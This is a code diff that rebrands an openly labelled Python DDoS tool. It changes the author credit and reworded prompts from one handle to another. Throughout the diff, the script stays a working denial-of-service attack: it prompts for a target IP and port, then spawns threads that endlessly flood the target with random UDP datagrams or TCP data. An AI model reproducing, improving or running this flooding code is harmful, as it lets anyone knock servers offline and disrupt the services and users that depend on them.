@@ -1,4 +1,4 @@
-#DDOS BY XALBADOR
+#C0DE BY XDEMPTERX
 import signal
 import time
 import socket
@@ -11,13 +11,7 @@ from os import system, name
 os.system("clear")
 os.system("figlet DDOS ATTACK -f slant")
 os.system("clear")
-print(" Ramake By : XALBADOR")
-print("██╗░░██╗██╗░░░░░██████╗░██████╗░░█████╗░██████╗░")
-print("╚██╗██╔╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗")
-print("░╚███╔╝░██║░░░░░██████╦╝██║░░██║██║░░██║██████╔╝")
-print("░██╔██╗░██║░░░░░██╔══██╗██║░░██║██║░░██║██╔══██╗")
-print("██╔╝╚██░███████╗██████╦╝██████╔╝╚█████╔╝██║░░██║")
-print("╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░╚═╝")
+print("===> Ramake By : XDempteRX <===")
 print("##  PENGGUNAAN DDOS KETIK 1 BUAT UDP KETIK 2 BUAT TCP  ##")
 print("######################################################### ")
 print("#LEBIH JELASNYA KETIK Python-UDP-Flood Python-TCP-Flood # ")
@@ -25,28 +19,28 @@ print("######################################################### ")
 test = input()
 if test == "n":
 	exit(0)
-ip = str(input(" HOST/IP:"))
-port = int(input(" PORT:"))
-choice = str(input(" Gas Ddos?(y/n):"))
-times = int(input(" PACKETS:"))
-threads = int(input(" THREAD:"))
+ip = str(input("===> HOST/IP TARGET:"))
+port = int(input("===> PORT TARGET:"))
+choice = str(input("===> KUY DDOS SERVERNYA?(y/n):"))
+times = int(input("===> PACKETS DDOS:"))
+threads = int(input("===> THREADS DDOS:"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[TOK.!!TOK.!!]","[TOK.!!TOK.!!]","[TOK.!!TOK.!!]"))
+	i = random.choice(("[%]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKETS SENT!!!")
 		except:
 			s.close()
-			print("[MAMPUS] PACKETS BOOM!!!")
+			print("DOWN!!!")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[TOK.!!TOK.!!]","[TOK.!!TOK.!!]","[TOK.!!TOK.!!]"))
+	i = random.choice(("[%]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
@@ -54,10 +48,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKETS SENT!!!")
 		except:
 			s.close()
-			print("[MAMPUS] PACKETS BOOM!!!")
+			print("DOWN!!!")
 
 for y in range(threads):
 	if choice == 'y':
